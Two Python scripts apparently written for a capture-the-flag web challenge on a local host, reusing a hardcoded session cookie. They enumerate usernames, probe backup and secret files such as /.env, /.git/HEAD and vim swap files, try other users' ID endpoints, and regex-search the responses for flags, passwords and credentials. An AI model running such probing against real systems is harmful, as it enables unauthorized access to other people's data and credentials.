import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("FINAL INVESTIGATION - Looking for hidden data")
print("=" * 80)

# Check the source code of /password/flag more carefully
print("\n[1] Analyzing /password/flag JavaScript and hidden data")
print("-" * 80)
resp = session.get(f"{BASE_URL}/password/flag")
print(f"Status: {resp.status_code}")

# Look for any comments, hidden data, etc.
comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
print(f"\nHTML Comments found: {len(comments)}")
for i, c in enumerate(comments):
    print(f"Comment {i+1}: {c.strip()[:200]}")

# Look for any script variables
script_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', resp.text)
print(f"\nScript variables: {script_vars}")

# Look for any hidden input fields
hidden_inputs = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', resp.text, re.I)
print(f"\nHidden input fields: {hidden_inputs}")

# All input fields
all_inputs = re.findall(r'<input[^>]+>', resp.text, re.I)
print(f"\nAll input fields ({len(all_inputs)}):")
for inp in all_inputs:
    print(f"  {inp}")

print("\n" + "=" * 80)
print("[2] Check if there's a way to enumerate all users")
print("=" * 80)

# Try common usernames and see if we get different user_ids
usernames = [
    'admin', 'administrator', 'root', 'user', 'test', 'flag', 'trading',
    'alice', 'bob', 'charlie', 'dave', 'eve', 'john', 'jane',
    'user1', 'user2', 'admin1', 'flaguser', 'ctf', 'guest'
]

print("\nEnumerating /password/<username> endpoints:")
for username in usernames:
    try:
        r = session.get(f"{BASE_URL}/password/{username}", timeout=3)
        if r.status_code == 200:
            uid_match = re.search(r'name=["\']user_id["\'][^>]+value=["\'](\d+)["\']', r.text)
            name_match = re.search(r'Welcome, ([^!<]+)', r.text)
            
            uid = uid_match.group(1) if uid_match else "N/A"
            name = name_match.group(1).strip() if name_match else "N/A"
            
            print(f"  /password/{username}: user_id={uid}, name={name}")
    except:
        pass

print("\n" + "=" * 80)
print("[3] Check static files and comments in main pages")
print("=" * 80)

# Check for source map files, comments in main pages
pages = ['/dashboard', '/password/test', '/']
for page in pages:
    r = session.get(f"{BASE_URL}{page}")
    comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
    if comments:
        print(f"\n{page} comments:")
        for c in comments:
            print(f"  {c.strip()[:200]}")

print("\n" + "=" * 80)
print("[4] Check response headers for server info")
print("=" * 80)

r = session.get(f"{BASE_URL}/dashboard")
print(f"Headers: {dict(r.headers)}")

print("\n" + "=" * 80)
print("[5] Try to find backup files or alternate versions")
print("=" * 80)

backup_patterns = [
    '/index.bak', '/index.old', '/index.html~',
    '/.git/HEAD', '/.env', '/config.php~',
    '/app.py~', '/main.py~', '/views.py~',
    '/password/test~', '/password/flag~',
]

for pattern in backup_patterns:
    try:
        r = session.get(f"{BASE_URL}{pattern}", timeout=3)
        if r.status_code == 200:
            print(f"\n[!] Found: {pattern}")
            print(f"Length: {len(r.text)}")
            if "FLAG{" in r.text or "flag" in r.text.lower():
                print(f"Content:\n{r.text[:1500]}")
    except:
        pass

print("\n" + "=" * 80)
print("[6] Check if 'flag' user has a dashboard accessible")
print("=" * 80)

# The flag user has user_id 10052, let's see if we can find their data
# Maybe other endpoints with /10052/ pattern
endpoints_10052 = [
    '/user/10052', '/profile/10052', '/account/10052',
    '/trade/10052', '/wallet/10052', '/portfolio/10052',
]

for endpoint in endpoints_10052:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=3)
        if r.status_code != 404:
            print(f"\n{endpoint}: Status {r.status_code}, Length {len(r.text)}")
            if "FLAG{" in r.text:
                print(f"[!] FLAG FOUND!\n{r.text}")
    except:
        pass

print("\n[FINAL INVESTIGATION COMPLETE]")

import requests
import re

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("EXAMINING BACKUP FILES")
print("=" * 80)

print("\n[1] Content of /password/test~ (backup file)")
print("-" * 80)
r1 = session.get(f"{BASE_URL}/password/test~")
print(f"Status: {r1.status_code}")
print(f"Length: {len(r1.text)} bytes")
print(f"Full content:\n{r1.text}")

print("\n" + "=" * 80)
print("[2] Content of /password/flag~ (backup file)")
print("-" * 80)
r2 = session.get(f"{BASE_URL}/password/flag~")
print(f"Status: {r2.status_code}")
print(f"Length: {len(r2.text)} bytes")
print(f"Full content:\n{r2.text}")

# Check for flags in backup content
print("\n" + "=" * 80)
print("[3] Searching backup files for flags and credentials")
print("=" * 80)

for path, response in [("test~", r1), ("flag~", r2)]:
    print(f"\nSearching {path}:")
    
    # Search for FLAG format
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"  [!] FLAGS: {flags}")
    
    # Search for password patterns
    passwords = re.findall(r'(password|pwd|pass)\s*[:=]\s*["\']?([^"\'\s<]+)', response.text, re.I)
    if passwords:
        print(f"  Password candidates: {passwords}")
    
    # Search for SQL queries
    sql = re.findall(r'(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+[^;]+', response.text, re.I)
    if sql:
        print(f"  SQL snippets: {sql[:3]}")
    
    # Search for hardcoded credentials
    creds = re.findall(r'(username|user)\s*[:=]\s*["\']([^"\']+)["\']', response.text, re.I)
    if creds:
        print(f"  Credentials: {creds}")

print("\n" + "=" * 80)
print("[4] Checking if backup files expose source code")
print("=" * 80)

# The backup files might be Python source code since Flask is used
if '.py' in r1.text or 'def ' in r1.text or 'import ' in r1.text:
    print("/password/test~ appears to be Python source code:")
    print(r1.text)
    
if '.py' in r2.text or 'def ' in r2.text or 'import ' in r2.text:
    print("/password/flag~ appears to be Python source code:")
    print(r2.text)

# Check for any .swp, .swo files (vim swap files)
print("\n" + "=" * 80)
print("[5] Checking for vim swap files")
print("=" * 80)

swap_paths = [
    '/.app.py.swp', '/.views.py.swp', '/.main.py.swp',
    '/password/.test.py.swp', '/password/.flag.py.swp',
    '/.app.py.swo', '/.views.py.swo'
]

for path in swap_paths:
    try:
        r = session.get(f"{BASE_URL}{path}", timeout=3)
        if r.status_code == 200:
            print(f"\n[!] Found vim swap: {path}")
            print(f"Length: {len(r.text)}")
    except:
        pass

# Check for other backup patterns
print("\n" + "=" * 80)
print("[6] Checking other backup patterns")
print("=" * 80)

other_patterns = [
    '/password/test.bak', '/password/flag.bak',
    '/password/test.old', '/password/flag.old',
    '/password/test.txt', '/password/flag.txt',
    '/password/test.py', '/password/flag.py',
    '/password/test.json', '/password/flag.json',
]

for path in other_patterns:
    try:
        r = session.get(f"{BASE_URL}{path}", timeout=3)
        if r.status_code == 200:
            print(f"\n[!] Found: {path}")
            print(f"Length: {len(r.text)}")
            print(f"Content:\n{r.text[:1500]}")
    except:
        pass

print("\n[BACKUP FILE ANALYSIS COMPLETE]")

